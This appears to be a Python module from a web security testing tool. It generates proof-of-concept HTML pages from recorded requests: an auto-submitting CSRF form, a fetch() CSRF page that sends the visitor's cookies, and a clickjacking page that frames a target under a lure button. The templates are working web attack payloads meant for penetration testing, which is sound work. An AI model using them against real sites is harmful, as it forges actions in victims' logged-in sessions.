"""Proof-of-concept HTML generators.

Two output flavours:

* :func:`csrf_form_poc`  — auto-submitting HTML form that fires the recorded
  state-changing request from any browser. Works for
  ``application/x-www-form-urlencoded`` and ``multipart/form-data``.
* :func:`csrf_fetch_poc` — JavaScript ``fetch()`` PoC, useful when the body
  type cannot be expressed as a form (JSON, custom content types). The page
  is intentionally a separate template so users can review and edit before
  delivery.
* :func:`clickjacking_poc` — embeds the target page in an iframe so the
  tester can visually demonstrate the absence of XFO / CSP frame-ancestors.

All output is plain HTML strings — no execution, no network calls.
"""
from __future__ import annotations

import html as _h
import json
import urllib.parse as up
from dataclasses import dataclass


@dataclass
class POC:
    title: str
    filename: str
    html: str


def _form_pairs(body: bytes, ct: str) -> list[tuple[str, str]]:
    text = body.decode("utf-8", errors="replace")
    if "x-www-form-urlencoded" in ct.lower():
        return up.parse_qsl(text, keep_blank_values=True)
    return []


def csrf_form_poc(method: str, url: str, headers: list[tuple[str, str]],
                   body: bytes, *, autosubmit: bool = True,
                   target_label: str = "the target") -> POC:
    ct = ""
    for k, v in headers:
        if k.lower() == "content-type":
            ct = v
            break
    pairs = _form_pairs(body, ct)
    inputs = "\n".join(
        f'  <input type="hidden" name="{_h.escape(k)}" value="{_h.escape(v)}">'
        for k, v in pairs
    )
    enctype = "application/x-www-form-urlencoded"
    if "multipart" in ct.lower():
        enctype = "multipart/form-data"
    submit_js = (
        '<script>document.getElementById("p").submit();</script>'
        if autosubmit else ""
    )
    html = f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>Reqlore — CSRF PoC for {_h.escape(url)}</title></head>
<body>
<h1>CSRF PoC</h1>
<p>This page demonstrates a Cross-Site Request Forgery against
<code>{_h.escape(url)}</code>. Open it while logged in to {_h.escape(target_label)}
to see the request fire automatically.</p>
<form id="p" action="{_h.escape(url)}" method="{_h.escape(method.lower())}" enctype="{enctype}">
{inputs}
</form>
{submit_js}
</body></html>
"""
    return POC(title=f"CSRF PoC: {method} {url}",
               filename="csrf-form-poc.html", html=html)


def csrf_fetch_poc(method: str, url: str, headers: list[tuple[str, str]],
                    body: bytes) -> POC:
    keep = []
    drop = {"host", "content-length", "cookie", "authorization", "user-agent",
            "referer", "origin", "connection", "accept-encoding"}
    for k, v in headers:
        if k.lower() not in drop:
            keep.append([k, v])
    body_str = body.decode("utf-8", errors="replace") if body else ""
    js_body = json.dumps(body_str) if body_str else "undefined"
    js_headers = json.dumps({k: v for k, v in keep})
    html = f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>Reqlore — fetch() CSRF PoC for {_h.escape(url)}</title></head>
<body>
<h1>fetch() CSRF PoC</h1>
<p>Sends the recorded request with the visitor's ambient credentials
(<code>credentials: 'include'</code>). The browser may apply CORS restrictions
to the response, but the request itself is delivered.</p>
<pre id="o" aria-live="polite">running…</pre>
<script>
fetch({json.dumps(url)}, {{
  method: {json.dumps(method.upper())},
  headers: {js_headers},
  body: {js_body},
  credentials: 'include',
  mode: 'no-cors'
}}).then(r => {{
  document.getElementById('o').textContent =
    'Status: ' + r.status + ' (opaque if cross-origin)';
}}).catch(e => {{
  document.getElementById('o').textContent = 'Error: ' + e;
}});
</script>
</body></html>
"""
    return POC(title=f"fetch() PoC: {method} {url}",
               filename="csrf-fetch-poc.html", html=html)


def clickjacking_poc(url: str, *, overlay_text: str = "Click here to win!") -> POC:
    """Generate a self-contained iframe + overlay demo page."""
    safe_url = _h.escape(url)
    safe_overlay = _h.escape(overlay_text)
    html = f"""<!doctype html>
<html lang="en"><head><meta charset="utf-8">
<title>Reqlore — clickjacking PoC for {safe_url}</title>
<style>
  body {{ font: 1rem/1.5 system-ui, sans-serif; margin: 2rem; }}
  .wrap {{ position: relative; width: 1024px; height: 720px; border: 1px solid #888; }}
  iframe {{ width: 100%; height: 100%; opacity: 0.5; border: 0; }}
  .lure {{
    position: absolute; left: 30%; top: 40%; padding: 1rem 2rem;
    background: #cf2; border: 2px solid #060; font-size: 2rem;
    transform: rotate(-3deg); pointer-events: none;
  }}
  .note {{ max-width: 60ch; }}
</style>
</head>
<body>
<h1>Clickjacking PoC</h1>
<p class="note">If you can see the target page below loaded inside an iframe,
the site is missing both <code>X-Frame-Options</code> and CSP
<code>frame-ancestors</code>. The overlay is for demonstration — in a real
attack it would cover a sensitive button on the framed page.</p>
<div class="wrap">
  <iframe src="{safe_url}" title="Framed target"></iframe>
  <p class="lure">{safe_overlay}</p>
</div>
</body></html>
"""
    return POC(title=f"Clickjacking PoC: {url}",
               filename="clickjacking-poc.html", html=html)
